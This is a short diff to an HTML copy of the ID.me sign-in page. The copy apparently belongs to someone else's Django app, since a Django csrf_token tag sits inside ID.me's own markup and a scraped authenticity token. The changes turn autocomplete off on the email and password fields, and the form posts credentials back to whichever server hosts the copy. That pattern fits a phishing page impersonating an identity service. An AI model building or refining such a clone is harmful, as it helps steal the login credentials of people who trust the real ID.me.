@@ -93,7 +93,8 @@ Sign in to ID.me - ID.me
 <div class="page-container" data-role="page-container">
 <div class="container">
 <div class="content-container">
-<form class="new_user" id="new_user" data-validate="signin"  accept-charset="UTF-8" method="post" novalidate="novalidate"><input type="hidden" name="authenticity_token" value="a5MEZ5x6fzd8Wv5FxarmrnmjxjR/AqoE2+CKlhxDWpOdm9OvA5QM0x13XdBfqnxL5ICgjb4Erfi8Tkicj2jGrw==" autocomplete="off"><input value="ca57c07b-5282-4a4c-85a2-321dfd84fb9f" autocomplete="off" type="hidden" name="user[session_id]" id="user_session_id">
+<form autocomplete="off" class="new_user" id="new_user" data-validate="signin"  accept-charset="UTF-8" method="post" novalidate="novalidate">
+    <input type="hidden" name="authenticity_token" value="a5MEZ5x6fzd8Wv5FxarmrnmjxjR/AqoE2+CKlhxDWpOdm9OvA5QM0x13XdBfqnxL5ICgjb4Erfi8Tkicj2jGrw==" autocomplete="off"><input value="ca57c07b-5282-4a4c-85a2-321dfd84fb9f" autocomplete="off" type="hidden" name="user[session_id]" id="user_session_id">
 <div class="form-header">
     {% csrf_token %}
 <div class="form-header-content" role="banner">
@@ -129,14 +130,14 @@ Sign in to ID.me - ID.me
 <div class="field-group">
 <div class="field text">
 <label for="user_email">Email</label>
-<input placeholder="Enter your email address" required="required" autocomplete="email" type="email" name="email" id="user_email">
+<input placeholder="Enter your email address" required="required" autocomplete="off" type="email" name="email" id="user_email">
 <span role="alert">
 
 </span>
 </div>
 <div class="field text password-showable" data-component="Components.Showable">
 <label for="user_password">Password</label>
-<input placeholder="Enter password" required="required" autocomplete="current-password" type="password" name="password" id="user_password"><button type="button" class="password-showable-button"><idme-icon name="eye" description="Show field"><template shadowrootmode="open"><!----><!--?lit$5458968068$--><!--?lit$5458968068$--><svg class="icon" height="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" display="block" role="img" aria-labelledby="icon-desc"><desc id="icon-desc">Show field</desc><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg><!--?--> </template></idme-icon></button>
+<input placeholder="Enter password" required="required" autocomplete="off" type="password" name="password" id="user_password"><button type="button" class="password-showable-button"><idme-icon name="eye" description="Show field"><template shadowrootmode="open"><!----><!--?lit$5458968068$--><!--?lit$5458968068$--><svg class="icon" height="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" display="block" role="img" aria-labelledby="icon-desc"><desc id="icon-desc">Show field</desc><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg><!--?--> </template></idme-icon></button>
 <span role="alert">
 
 </span>
